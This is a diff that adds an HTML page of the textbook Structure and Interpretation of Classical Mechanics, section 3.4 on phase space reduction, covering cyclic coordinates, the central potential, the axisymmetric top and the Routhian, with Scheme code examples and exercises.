@@ -1,0 +1,493 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-39.html">previous</a></span><span>, <a href="book-Z-H-41.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_3.4"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_3.4">3.4&nbsp;&nbsp;Phase Space Reduction</a></h2>
+<p>
+<a name="%_idx_1736"></a><a name="%_idx_1738"></a><a name="%_idx_1740"></a>Our motivation for the development of Hamilton's equations was to
+focus attention on the quantities that can be conserved -- the
+momenta and the energy.  In the Hamiltonian formulation the
+generalized configuration coordinates and the conjugate momenta
+comprise the state of the system at a given time.  
+We know from the
+Lagrangian formulation that if the Lagrangian does not depend on some
+coordinate then the conjugate momentum is conserved.  This is also
+true in the Hamiltonian formulation, but there is a distinct advantage
+to the Hamiltonian formulation.  In the Lagrangian formulation the
+knowledge of the conserved momentum does not lead immediately to any
+simplification of the problem, but in the Hamiltonian formulation the
+fact that momenta are conserved gives an immediate reduction in the
+dimension of the system to be solved.
+In fact, if a coordinate does not appear in the Hamiltonian then the
+dimension of the system of coupled equations that remain to be solved
+is reduced by two -- the coordinate does not appear and the conjugate
+momentum is constant.</p>
+<p>
+Let <em>H</em>(<em>t</em>, <em>q</em>, <em>p</em>) be a Hamiltonian for some
+problem with an <em>n</em>-dimensional configuration space and
+2<em>n</em>-dimensional phase space.   Suppose the Hamiltonian does not
+depend upon the <em>i</em>th coordinate <em>q</em><sup><em>i</em></sup>: (<img src="front-Z-G-D-2.gif" border="0"><sub>1</sub> <em>H</em>)<sub><em>i</em></sub>  =  0.<a name="call_footnote_Temp_257" href="#footnote_Temp_257"><sup><small>19</small></sup></a>
+According to Hamilton's equations, the conjugate momentum <em>p</em><sub><em>i</em></sub> is
+conserved.  Hamilton's equations of motion for the remaining 2<em>n</em> <tt>-</tt> 2
+phase-space variables do not involve <em>q</em><sup><em>i</em></sup> (because it does not appear
+in the Hamiltonian), and <em>p</em><sub><em>i</em></sub> is a constant.  Thus the dimension of
+the difficult part of the problem, the part that involves the solution
+of coupled ordinary differential equations, is reduced by two.  The
+remaining equation governing the evolution of <em>q</em><sup><em>i</em></sup> in general depends
+on all the other variables, but once the reduced problem has been
+solved, the equation of motion for <em>q</em><sup><em>i</em></sup> can be written so as to
+give <em>D</em><em>q</em><sup><em>i</em></sup> explicitly as a function of time.  We can then find
+<em>q</em><sup><em>i</em></sup> as a definite integral of this function.<a name="call_footnote_Temp_258" href="#footnote_Temp_258"><sup><small>20</small></sup></a></p>
+<p>
+Contrast this result with analogous results for more general systems
+of differential equations.  There are two independent situations.
+One situation is that we know a constant of the motion.  In general, 
+constants of the motion can be used to reduce by one the dimension of the
+unsolved part of the problem.  To see this, let the system of
+equations be 
+<a name="EQUATION_3.96"></a></p>
+<div align=left><img src="chap3-Z-G-102.gif" border="0"></div>
+<p> 
+where <em>m</em> is the dimension of the system.  Assume we know some
+constant of the motion
+<a name="EQUATION_3.97"></a></p>
+<div align=left><img src="chap3-Z-G-103.gif" border="0"></div>
+<p>
+At least locally, we expect that we can use this equation to solve for
+<em>z</em><sup><em>m</em><tt>-</tt>1</sup>(<em>t</em>) in terms of all the other variables, and use this solution to
+eliminate the dependence on <em>z</em><sup><em>m</em><tt>-</tt>1</sup>(<em>t</em>).  The first <em>m</em> <tt>-</tt> 1 equations then
+depend only upon the first <em>m</em> <tt>-</tt> 1 variables.  The dimension of the
+system of equations to be solved is reduced by one.  After the
+solution for the other variables has been found, <em>z</em><sup><em>m</em><tt>-</tt>1</sup>(<em>t</em>) can be found
+using the constant of the motion.</p>
+<p>
+The second situation is that one of the variables, say <em>z</em><sup><em>i</em></sup>, does not
+appear in the equations of motion (but there is an equation
+for&nbsp;<em>D</em><em>z</em><sup><em>i</em></sup>).  
+In this case the equations for the other variables form an
+independent set of equations of one dimension less than the original
+system.  After these are solved, then the remaining equation for <em>z</em><sup><em>i</em></sup>
+can be solved by definite integration.</p>
+<p>
+In both situations the dimension of the system of coupled equations is
+reduced by one.  Hamilton's equations are different in that
+these two situations often come together.  If a Hamiltonian for a
+system does not depend on a particular coordinate, then the equations of
+motion for the other coordinates and momenta do not depend on that
+coordinate.  Furthermore, the momentum conjugate to that coordinate is
+a constant of the motion.  An added benefit is that the use of this
+constant of the motion to reduce the dimension of the remaining
+equations is automatic in the Hamiltonian formulation.  The conserved
+momentum is a state variable and just a parameter in the
+remaining equations.</p>
+<p>
+So if there is a continuous symmetry it will probably be to our
+advantage to choose a coordinate system that explicitly
+incorporates the symmetry, making the Hamiltonian independent of a
+coordinate.  Then the dimension of the phase space of the coupled
+system will be reduced by two for every coordinate that does not
+appear in the Hamiltonian.<a name="call_footnote_Temp_259" href="#footnote_Temp_259"><sup><small>21</small></sup></a></p>
+<p>
+</p>
+<a name="%_sec_Temp_260"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_260">Motion in a central potential</a></h4>
+<p><a name="%_idx_1752"></a>Consider the motion of a particle of mass <em>m</em> in a central potential.  A 
+natural choice for generalized coordinates that reflects the symmetry is polar
+coordinates.  <a name="%_idx_1754"></a>A Lagrangian is (equation&nbsp;<a href="book-Z-H-13.html#EQUATION_1.67">1.67</a>):
+<a name="EQUATION_3.98"></a></p>
+<div align=left><img src="chap3-Z-G-104.gif" border="0"></div>
+<p>
+The momenta are <em>p</em><sub><em>r</em></sub>  =  <em>m</em> <img src="chap1-Z-G-D-33.gif" border="0"> and <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub>  =  <em>m</em> <em>r</em><sup>2</sup> <img src="chap1-Z-G-D-34.gif" border="0">.
+The kinetic energy is a homogeneous quadratic form in the velocities,
+so the <a name="%_idx_1756"></a>Hamiltonian is <em>T</em> + <em>V</em> with the velocities rewritten in 
+terms of the momenta:
+<a name="EQUATION_3.99"></a></p>
+<div align=left><img src="chap3-Z-G-105.gif" border="0"></div>
+<p>
+<a name="%_idx_1758"></a>Hamilton's equations are
+<a name="EQUATION_3.100"></a></p>
+<div align=left><img src="chap3-Z-G-106.gif" border="0"></div>
+<p>
+The potential energy depends on the distance from the origin, <em>r</em>, as does
+the kinetic energy in polar coordinates, but neither the potential
+energy nor
+the kinetic energy depends on the polar angle <img src="chap1-Z-G-D-16.gif" border="0">.  The angle
+<img src="chap1-Z-G-D-16.gif" border="0"> does not appear in the Lagrangian so we know that
+<em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub>, the momentum conjugate to <img src="chap1-Z-G-D-16.gif" border="0">, is conserved along
+realizable trajectories.  The fact that <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub> is constant along
+realizable paths is expressed by one of Hamilton's equations.  That
+<em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub> has a constant value is immediately made use of in the
+other Hamilton's equations: the remaining equations are a
+self-contained subsystem with constant <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub>.  To make a
+lower-dimensional subsystem in the Lagrangian formulation we have to use each
+conserved momentum to eliminate one of the other state variables, as we
+did for the axisymmetric top (see section&nbsp;<a href="book-Z-H-30.html#%_sec_2.10">2.10</a>).</p>
+<p>
+
+We can check our derivations with the computer.
+A procedure implementing the Lagrangian has already been introduced
+(below equation&nbsp;<a href="book-Z-H-13.html#EQUATION_1.67">1.67</a>).  We can use this
+to get the Hamiltonian:
+</p>
+<p><tt>(show-expression<br>
+&nbsp;((Lagrangian-&gt;Hamiltonian&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(L-central-polar&nbsp;'m&nbsp;(literal-function&nbsp;'V)))<br>
+&nbsp;&nbsp;(up&nbsp;'t&nbsp;(up&nbsp;'r&nbsp;'phi)&nbsp;(down&nbsp;'p_r&nbsp;'p_phi))))<br>
+</p>
+</tt>
+<p></p>
+<hr>
+
+<p></p>
+<div align=left><img src="chap3-Z-G-107.gif" border="0"></div>
+<p></p>
+<hr>
+
+<p>
+and to develop Hamilton's equations:
+</p>
+<p><tt>(show-expression<br>
+&nbsp;(((Hamilton-equations<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Lagrangian-&gt;Hamiltonian&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(L-central-polar&nbsp;'m&nbsp;(literal-function&nbsp;'V))))<br>
+&nbsp;&nbsp;&nbsp;(up&nbsp;(literal-function&nbsp;'r)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(literal-function&nbsp;'phi))<br>
+&nbsp;&nbsp;&nbsp;(down&nbsp;(literal-function&nbsp;'p_r)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(literal-function&nbsp;'p_phi)))<br>
+&nbsp;&nbsp;'t))<br>
+</p>
+</tt>
+<p></p>
+<hr>
+
+<p></p>
+<div align=left><img src="chap3-Z-G-108.gif" border="0"></div>
+<p></p>
+<hr>
+
+<p></p>
+<p>
+
+</p>
+<a name="%_sec_Temp_261"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_261">Axisymmetric top</a></h4>
+<p><a name="%_idx_1760"></a>We reconsider the axisymmetric top (see
+section&nbsp;<a href="book-Z-H-30.html#%_sec_2.10">2.10</a>) from the Hamiltonian point of
+view.  Recall that a top is a rotating rigid body, one point of which
+is fixed in space.  The center of mass is not at the fixed point, and
+there is a uniform gravitational field.  An axisymmetric top is a top
+with an axis of symmetry.  We consider here an axisymmetric top with
+the fixed point on the symmetry axis.</p>
+<p>
+The axisymmetric top has two continuous <a name="%_idx_1762"></a><a name="%_idx_1764"></a>symmetries we would like
+to exploit.  It has the symmetry that neither the kinetic nor
+potential energy is sensitive to the orientation of the top about the
+symmetry axis.  The kinetic and potential energy are also insensitive
+to a rotation of the physical system about the vertical axis, because
+the gravitational field is uniform.  We take advantage of these
+symmetries by choosing coordinates that naturally express them.  We
+already have an appropriate coordinate system that does the job -- the
+Euler angles.  We choose the reference orientation of the top so that
+the symmetry axis is vertical.  The first Euler angle <img src="chap1-Z-G-D-56.gif" border="0"> expresses
+a rotation about the symmetry axis.  The next Euler angle <img src="chap1-Z-G-D-19.gif" border="0"> is
+the tilt of the symmetry axis of the top from the vertical.  The third
+Euler angle <img src="chap1-Z-G-D-16.gif" border="0"> expresses a rotation of the top about the fixed
+<em>z</em> axis.  The symmetries of the problem imply that the first and
+third Euler angles do not appear in the Hamiltonian.  As a consequence
+the momenta conjugate to these angles are conserved quantities.  The
+problem of determining the motion of the axisymmetric top is reduced
+to the problem of determining the evolution of <img src="chap1-Z-G-D-19.gif" border="0"> and
+<em>p</em><sub><img src="chap1-Z-G-D-19.gif" border="0"></sub>.  Let's work out the details.</p>
+<p>
+In terms of Euler angles, a Lagrangian for the axisymmetric top is
+(see section&nbsp;<a href="book-Z-H-30.html#%_sec_2.10">2.10</a>):
+</p>
+<p><tt><a name="%_idx_1766"></a>(define&nbsp;((L-axisymmetric-top&nbsp;A&nbsp;C&nbsp;gMR)&nbsp;local)<br>
+&nbsp;&nbsp;(let&nbsp;((q&nbsp;(coordinate&nbsp;local))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(qdot&nbsp;(velocity&nbsp;local)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(let&nbsp;((theta&nbsp;(ref&nbsp;q&nbsp;0))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(thetadot&nbsp;(ref&nbsp;qdot&nbsp;0))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(phidot&nbsp;(ref&nbsp;qdot&nbsp;1))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(psidot&nbsp;(ref&nbsp;qdot&nbsp;2)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(+&nbsp;(*&nbsp;1/2&nbsp;A<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(+&nbsp;(square&nbsp;thetadot)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(square&nbsp;(*&nbsp;phidot&nbsp;(sin&nbsp;theta)))))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(*&nbsp;1/2&nbsp;C<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(square&nbsp;(+&nbsp;psidot&nbsp;(*&nbsp;phidot&nbsp;(cos&nbsp;theta)))))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(*&nbsp;-1&nbsp;gMR&nbsp;(cos&nbsp;theta))))))<br>
+</p>
+</tt>
+<p>where <tt>gMR</tt> is the product of the gravitational
+acceleration, the mass of the top, and the distance from
+the point of support to the center of mass.   The Hamiltonian is nicer
+than we have a right to expect:
+</p>
+<p><tt>(show-expression<br>
+&nbsp;((Lagrangian-&gt;Hamiltonian&nbsp;(L-axisymmetric-top&nbsp;'A&nbsp;'C&nbsp;'gMR))&nbsp;<br>
+&nbsp;&nbsp;(up&nbsp;'t<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;'theta&nbsp;'phi&nbsp;'psi)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(down&nbsp;'p_theta&nbsp;'p_phi&nbsp;'p_psi))))<br>
+</p>
+</tt>
+<p></p>
+<hr>
+
+<p></p>
+<div align=left><img src="chap3-Z-G-109.gif" border="0"></div>
+<p></p>
+<hr>
+
+<p>
+Note that the angles <img src="chap1-Z-G-D-16.gif" border="0"> and <img src="chap1-Z-G-D-56.gif" border="0"> do not appear in the
+Hamiltonian, as expected.  Thus the momenta <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub> and <em>p</em><sub><img src="chap1-Z-G-D-56.gif" border="0"></sub> are
+constants of the motion.</p>
+<p>
+For given values of <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub> and <em>p</em><sub><img src="chap1-Z-G-D-56.gif" border="0"></sub> we must determine the
+evolution of <img src="chap1-Z-G-D-19.gif" border="0"> and <em>p</em><sub><img src="chap1-Z-G-D-19.gif" border="0"></sub>.  The <a name="%_idx_1768"></a><a name="%_idx_1770"></a>effective Hamiltonian for <img src="chap1-Z-G-D-19.gif" border="0">
+and <em>p</em><sub><img src="chap1-Z-G-D-19.gif" border="0"></sub> has one degree of freedom,
+and does not involve the time.  Thus the value of the
+Hamiltonian is conserved along realizable trajectories.  So
+the trajectories of <img src="chap1-Z-G-D-19.gif" border="0"> and <em>p</em><sub><img src="chap1-Z-G-D-19.gif" border="0"></sub> trace
+contours of the effective Hamiltonian.  This gives us a big
+picture of the possible types of motion and their relationship, for
+given values of <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub> and <em>p</em><sub><img src="chap1-Z-G-D-56.gif" border="0"></sub>.</p>
+<p>
+If the top is standing vertically then <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub>  =  <em>p</em><sub><img src="chap1-Z-G-D-56.gif" border="0"></sub>.  Let's
+concentrate on the case that <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub>  =  <em>p</em><sub><img src="chap1-Z-G-D-56.gif" border="0"></sub>, and define <em>p</em>  = 
+<em>p</em><sub><img src="chap1-Z-G-D-56.gif" border="0"></sub>  =  <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub>.  The effective Hamiltonian becomes (after a little
+trigonometric simplification)
+<a name="EQUATION_3.101"></a></p>
+<div align=left><img src="chap3-Z-G-110.gif" border="0"></div>
+<p>
+Defining the effective potential energy
+<a name="EQUATION_3.102"></a></p>
+<div align=left><img src="chap3-Z-G-111.gif" border="0"></div>
+<p>
+which parametrically depends on <em>p</em>, the effective
+Hamiltonian is
+<a name="EQUATION_3.103"></a></p>
+<div align=left><img src="chap3-Z-G-112.gif" border="0"></div>
+<p></p>
+<p>
+<a name="FIGURE_3.5"></a></p>
+<div align=left><img src="chap3-Z-G-113.gif" border="0"></div>
+<p></p>
+<p>
+If <em>p</em> is large, <em>U</em><sub><em>p</em></sub> has a single minimum at <img src="chap1-Z-G-D-19.gif" border="0"> = 0, as
+seen in figure&nbsp;<a href="#FIGURE_3.5">3.5</a>.  For small <em>p</em> there is a
+minimum for finite positive <img src="chap1-Z-G-D-19.gif" border="0"> and a symmetrical minimum for
+negative <img src="chap1-Z-G-D-19.gif" border="0">; there is a local maximum at <img src="chap1-Z-G-D-19.gif" border="0"> = 0.  There is a
+critical value of <em>p</em> at which <img src="chap1-Z-G-D-19.gif" border="0"> = 0 changes from a minimum
+to a local maximum.  Denote the critical value by <em>p</em><sub><em>c</em></sub>.  A simple
+calculation shows <em>p</em><sub><em>c</em></sub>  =  (4 <em>g</em> <em>M</em> <em>R</em> <em>A</em>)<sup>1/2</sup>.  For <img src="chap1-Z-G-D-19.gif" border="0">  =  0 we have
+<em>p</em>  =  <em>C</em><img src="chap1-Z-G-D-23.gif" border="0">, where <img src="chap1-Z-G-D-23.gif" border="0"> is the rotation rate.  Thus to <em>p</em><sub><em>c</em></sub>
+there corresponds a critical rotation rate <a name="EQUATION_3.104"></a></p>
+<div align=left><img src="chap3-Z-G-114.gif" border="0"></div>
+<p> <a name="%_idx_1772"></a>For <img src="chap1-Z-G-D-23.gif" border="0"> &gt;
+<img src="chap1-Z-G-D-23.gif" border="0"><sub><em>c</em></sub> the top can stand vertically; for <img src="chap1-Z-G-D-23.gif" border="0"> &lt; <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>c</em></sub> the
+top falls if slightly displaced from the vertical.  The top that
+stands vertically is called the <a name="%_idx_1774"></a><a name="%_idx_1776"></a>``sleeping'' top.
+For a more realistic top, friction gradually slows
+the rotation; the rotation rate eventually falls below
+<a name="%_idx_1778"></a><a name="%_idx_1780"></a>the critical rotation rate and the top ``wakes up.''</p>
+<p>
+<a name="FIGURE_3.6"></a></p>
+<div align=left><img src="chap3-Z-G-115.gif" border="0"></div>
+<p>
+<a name="FIGURE_3.7"></a></p>
+<div align=left><img src="chap3-Z-G-116.gif" border="0"></div>
+<p></p>
+<p>
+We get additional insight into the sleeping top and the awake top by
+looking at the trajectories in the <img src="chap1-Z-G-D-19.gif" border="0">, <em>p</em><sub><img src="chap1-Z-G-D-19.gif" border="0"></sub> phase plane.
+The trajectories in this plane are simply contours of the Hamiltonian,
+because the Hamiltonian is conserved.  Figure&nbsp;<a href="#FIGURE_3.6">3.6</a> shows
+a <a name="%_idx_1782"></a>phase portrait for <img src="chap1-Z-G-D-23.gif" border="0"> &gt; <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>c</em></sub>.  All of the trajectories are
+loops around the vertical (<img src="chap1-Z-G-D-19.gif" border="0"> = 0).  Displacing the top slightly
+from the vertical simply places the top on a nearby loop, so the top
+stays nearly vertical.  Figure&nbsp;<a href="#FIGURE_3.7">3.7</a> shows the phase
+portrait for <img src="chap1-Z-G-D-23.gif" border="0"> &lt; <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>c</em></sub>.  Here the vertical position is an
+unstable equilibrium.  The trajectories that approach the vertical
+are asymptotic -- they take an infinite amount of time to reach it,
+just as a pendulum with just the right initial conditions can approach
+the vertical but never reach it.  If the top is displaced slightly
+from the vertical then the trajectories loop around another center
+with nonzero <img src="chap1-Z-G-D-19.gif" border="0">.  A top started at the center point of the loop
+stays there, and one started near this equilibrium point loops stably
+around it.  Thus we see that when the top ``wakes up'' the vertical is
+unstable, but the top does not fall to the ground.  Rather, it
+oscillates around a new equilibrium.</p>
+<p>
+<a name="FIGURE_3.8"></a></p>
+<div align=left><img src="chap3-Z-G-117.gif" border="0"></div>
+<p></p>
+<p>
+It is also interesting to consider the axisymmetric top when <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub>
+ne <em>p</em><sub><img src="chap1-Z-G-D-56.gif" border="0"></sub>.  Consider the case <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub> &gt; <em>p</em><sub><img src="chap1-Z-G-D-56.gif" border="0"></sub>.  Some
+trajectories in the <img src="chap1-Z-G-D-19.gif" border="0">, <em>p</em><sub><img src="chap1-Z-G-D-19.gif" border="0"></sub> plane are shown in
+figure&nbsp;<a href="#FIGURE_3.8">3.8</a>.  Note that in this case trajectories
+do not go through <img src="chap1-Z-G-D-19.gif" border="0"> = 0.  The phase portrait for <em>p</em><sub><img src="chap1-Z-G-D-16.gif" border="0"></sub> &lt;
+<em>p</em><sub><img src="chap1-Z-G-D-56.gif" border="0"></sub> is similar and is not shown.</p>
+<p>
+We have reduced the motion of the axisymmetric top to quadratures by
+choosing coordinates that express the symmetries.  It turns out that
+the resulting integrals can be expressed in terms of elliptic
+functions.  Thus, the axisymmetric top can be solved analytically.  We
+do not dwell on this solution because it is not very illuminating:
+since most problems cannot be solved analytically, there is
+little profit in dwelling on the analytic solution of one of the rare
+problems that is analytically solvable.  Rather, we have
+focused on the geometry of the solutions in the phase space and the
+use of integrals to reduce the dimension of the problem.  With the
+phase-space portrait we have found some interesting qualitative
+features of the motion of the top.</p>
+<p>
+</p>
+<p><a name="%_thm_3.8"></a>
+<b>Exercise 3.8.</b>&nbsp;&nbsp;<strong>Sleeping top</strong><br>
+Verify that the critical angular velocity above which an
+axisymmetric top can sleep is given by
+equation&nbsp;(<a href="#EQUATION_3.104">3.104</a>).
+</p>
+
+<p></p>
+<p>
+
+</p>
+<a name="%_sec_3.4.1"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_3.4.1">3.4.1&nbsp;&nbsp;Lagrangian Reduction</a></h3>
+<p><a name="%_idx_1784"></a><a name="%_idx_1786"></a><a name="%_idx_1788"></a>
+Suppose there are cyclic coordinates.  In the Hamiltonian formulation,
+the equations of motion for the coordinates and momenta for the other
+degrees of freedom form a self-contained subsystem in which the
+momenta conjugate to the cyclic coordinates are parameters.  We can
+form a Lagrangian for this subsystem by performing a Legendre
+transform of the reduced Hamiltonian.  Alternatively, we can start
+with the full Lagrangian and perform a Legendre transform for only
+those coordinates that are cyclic.  The equations of motion are
+Hamilton's equations for those variables that are transformed and
+Lagrange's equations for the others.  The momenta conjugate to the
+cyclic coordinates are conserved and can be treated as parameters in
+the Lagrangian for the remaining coordinates.</p>
+<p>
+Divide the tuple <em>q</em> of coordinates into two subtuples <em>q</em>  =  (<em>x</em>, <em>y</em>).
+Assume <em>L</em>(<em>t</em>; <em>x</em>, <em>y</em>; <em>v</em><sub><em>x</em></sub>, <em>v</em><sub><em>y</em></sub>) is a Lagrangian for the system.  
+Define the <a name="%_idx_1790"></a>Routhian <em>R</em> as the Legendre transform of <em>L</em> with respect
+to the <em>v</em><sub><em>y</em></sub> slot:
+<a name="EQUATION_3.105"></a></p>
+<div align=left><img src="chap3-Z-G-118.gif" border="0"></div>
+<p>
+To define the function <em>R</em> we must solve
+equation&nbsp;(<a href="#EQUATION_3.105">3.105</a>) for <em>v</em><sub><em>y</em></sub> in terms of the
+other variables, and substitute this into
+equation&nbsp;(<a href="#EQUATION_3.105">3.105</a>).</p>
+<p>
+Define the state path <img src="chap3-Z-G-D-6.gif" border="0">:
+<a name="EQUATION_3.111"></a></p>
+<div align=left><img src="chap3-Z-G-119.gif" border="0"></div>
+<p>
+where
+<a name="EQUATION_3.112"></a></p>
+<div align=left><img src="chap3-Z-G-120.gif" border="0"></div>
+<p>
+Realizable paths satisfy the equations of motion
+<a name="EQUATION_3.113"></a></p>
+<div align=left><img src="chap3-Z-G-121.gif" border="0"></div>
+<p>
+which are Lagrange's equations for <em>x</em> and Hamilton's
+equations for <em>y</em> and <em>p</em><sub><em>y</em></sub>.</p>
+<p>
+Now suppose that the Lagrangian is cyclic in <em>y</em>.  Then
+<img src="front-Z-G-D-2.gif" border="0"><sub>1,1</sub> <em>L</em>  =  <img src="front-Z-G-D-2.gif" border="0"><sub>1,1</sub> <em>R</em>  =  0, and <em>p</em><sub><em>y</em></sub>(<em>t</em>) is a constant
+ <em>c</em>  on any realizable path.  Equation&nbsp;(<a href="#EQUATION_3.113">3.113</a>) does not
+depend on <em>y</em>, by assumption, and we can replace <em>p</em><sub><em>y</em></sub> by its constant
+value <em>c</em>.  So equation&nbsp;(<a href="#EQUATION_3.113">3.113</a>) forms a closed
+subsystem for the path <em>x</em>.  The Lagrangian <em>L</em><sub><em>c</em></sub>
+<a name="EQUATION_3.116"></a></p>
+<div align=left><img src="chap3-Z-G-122.gif" border="0"></div>
+<p>
+describes the motion of the subsystem (the minus sign is introduced
+for convenience, and &curren; indicates that the function's value is
+independent of this argument).
+The path <em>y</em> can be found by integrating
+equation&nbsp;(<a href="#EQUATION_3.113">3.114</a>) using the independently determined path
+<em>x</em>.</p>
+<p>
+
+Define the action 
+<a name="EQUATION_3.117"></a></p>
+<div align=left><img src="chap3-Z-G-123.gif" border="0"></div>
+<p>
+The realizable paths <em>x</em> satisfy the Lagrange equations with the
+Lagrangian <em>L</em><sub><em>c</em></sub>, so the action <em>S</em>'<sub><em>c</em></sub> is stationary with respect to
+variations <img src="chap1-Z-G-D-18.gif" border="0"> of <em>x</em> that are zero at the end times:
+<a name="EQUATION_3.118"></a></p>
+<div align=left><img src="chap3-Z-G-124.gif" border="0"></div>
+<p></p>
+<p>
+For realizable paths <em>q</em> the action <em>S</em>[<em>q</em>](<em>t</em><sub>1</sub>, <em>t</em><sub>2</sub>) is stationary
+with respect to variations <img src="chap1-Z-G-D-13.gif" border="0"> of <em>q</em> that are zero at the end
+times.  Along these paths the momentum <em>p</em><sub><em>y</em></sub>(<em>t</em>) has the constant value
+<em>c</em>.  For these same paths the action <em>S</em>'<sub><em>c</em></sub>[<em>x</em>](<em>t</em><sub>1</sub>, <em>t</em><sub>2</sub>) is
+stationary with respect to variations <img src="chap1-Z-G-D-18.gif" border="0"> of <em>x</em> that are zero at
+the end times.  The dimension of <img src="chap1-Z-G-D-18.gif" border="0"> is smaller than the dimension
+of <img src="chap1-Z-G-D-13.gif" border="0">.</p>
+<p>
+The values of the actions <em>S</em>'<sub><em>c</em></sub>[<em>x</em>](<em>t</em><sub>1</sub>, <em>t</em><sub>2</sub>) and <em>S</em>[<em>q</em>](<em>t</em><sub>1</sub>, <em>t</em><sub>2</sub>) are
+related:
+<a name="EQUATION_3.119"></a></p>
+<div align=left><img src="chap3-Z-G-125.gif" border="0"></div>
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_3.9"></a>
+<b>Exercise 3.9.</b>&nbsp;&nbsp;<strong>Routhian equations of motion</strong><br>
+<a name="%_idx_1792"></a>
+Verify that the equations of motion are given by
+equations&nbsp;(<a href="#EQUATION_3.113">3.113</a>-<a href="#EQUATION_3.113">3.115</a>).</p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_257" href="#call_footnote_Temp_257"><sup><small>19</small></sup></a> If a Lagrangian does not depend on a particular coordinate
+<a name="%_idx_1742"></a><a name="%_idx_1744"></a><a name="%_idx_1746"></a>  then neither does the corresponding Hamiltonian, because the
+coordinate is a passive variable in the Legendre transform.  Such a
+Hamiltonian is said to be cyclic in that coordinate.</p>
+
+<p><a name="footnote_Temp_258" href="#call_footnote_Temp_258"><sup><small>20</small></sup></a> Traditionally, when a problem has been reduced to the
+<a name="%_idx_1748"></a><a name="%_idx_1750"></a>  evaluation of a definite integral it is said to be reduced to a
+``quadrature.''  Thus, the determination of the evolution of a cyclic
+coordinate <em>q</em><sup><em>i</em></sup> is reduced to a problem of quadrature.</p>
+
+<p><a name="footnote_Temp_259" href="#call_footnote_Temp_259"><sup><small>21</small></sup></a> It is not always possible to choose a set of generalized
+coordinates in which all symmetries are simultaneously manifest.  For
+these systems, the reduction of the phase space is more complicated.
+We have already encountered such a problem: the motion of a free rigid
+body.  The system is invariant under rotation about any axis, yet no
+single coordinate system can reflect this symmetry.  Nevertheless, we
+have already found that the dynamics is described by a system of lower
+dimension that the full phase space: the Euler equations.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-39.html">previous</a></span><span>, <a href="book-Z-H-41.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
